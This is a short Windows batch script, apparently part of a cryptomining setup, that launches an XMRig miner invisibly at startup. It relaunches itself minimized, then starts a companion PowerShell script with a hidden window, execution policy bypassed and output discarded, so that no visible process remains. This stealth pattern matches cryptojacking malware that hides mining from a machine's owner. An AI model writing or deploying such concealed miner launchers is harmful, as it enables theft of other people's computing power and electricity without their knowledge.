@echo off
REM Invisible Startup Controller
REM Ensures completely silent and invisible startup of single XMRig instance

REM Hide this window immediately
if "%1"=="hide" goto :hidden
start "" /min "%~f0" hide
exit /b

:hidden
REM Now running minimized - start PowerShell completely hidden
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%~dp0single_instance_manager.ps1' -Startup" >nul 2>&1 &

REM Exit immediately to avoid any visible processes
exit /b
